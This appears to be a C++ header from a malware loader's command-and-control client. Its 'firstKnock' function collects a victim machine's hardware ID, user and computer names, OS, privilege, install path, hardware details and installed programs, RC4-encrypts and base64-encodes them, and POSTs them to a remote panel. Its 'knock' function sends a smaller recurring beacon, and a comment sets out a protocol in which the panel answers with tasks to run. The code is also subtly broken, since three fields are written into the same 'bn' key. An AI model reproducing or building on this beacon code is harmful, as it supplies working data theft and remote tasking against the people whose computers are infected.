#pragma once
/*
	Request - Knock (Encrypted + Base64)
	{
		"hardwareID": "",
		"privilege: ""
	}

	Responce
	{
		"task": (Internal Task ID, 0 for notask),
		"taskId": (GUID for identifying task to panel),
		"taskParm": (optional task parmerters (list)),
	}
*/
#include <string>

namespace absent
{
	namespace panel
	{
		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;
			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bn"], key).c_str());	//Build Name
			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bt"], key).c_str());	//Build Type
			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str());	//Build
			info["hw"] = absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str());	//Hardware Id
			info["un"] = absent::crypto::b64::encode(rc4.crypt(info["un"], key).c_str());	//User Name
			info["cn"] = absent::crypto::b64::encode(rc4.crypt(info["cn"], key).c_str());	//Computer Name
			info["os"] = absent::crypto::b64::encode(rc4.crypt(info["os"], key).c_str());	//Operating System
			info["pr"] = absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str());	//Client Privlege
			info["ip"] = absent::crypto::b64::encode(rc4.crypt(info["ip"], key).c_str());	//Install Path
			info["cp"] = absent::crypto::b64::encode(rc4.crypt(info["cp"], key).c_str());	//Cpu Info
			info["ca"] = absent::crypto::b64::encode(rc4.crypt(info["ca"], key).c_str());	//Cpu Architecture
			info["cc"] = absent::crypto::b64::encode(rc4.crypt(info["cc"], key).c_str());	//Cpu Core Count
			info["gp"] = absent::crypto::b64::encode(rc4.crypt(info["gp"], key).c_str());	//Gpu
			info["ra"] = absent::crypto::b64::encode(rc4.crypt(info["ra"], key).c_str());	//Ram
			info["vr"] = absent::crypto::b64::encode(rc4.crypt(info["vr"], key).c_str());	//Vram
			for (int ip = 0; ip < info["fp"].size(); ip++) {info["fp"][ip] =  absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str());} //Found / Installed Programs
			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());

			return absent::http::post(host, path, toSend);
		}

		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;
			nlohmann::json smallInfo = 
			{
				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())}
			};
			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
			
			return absent::http::post(host, path, toSend);
		}
	}
}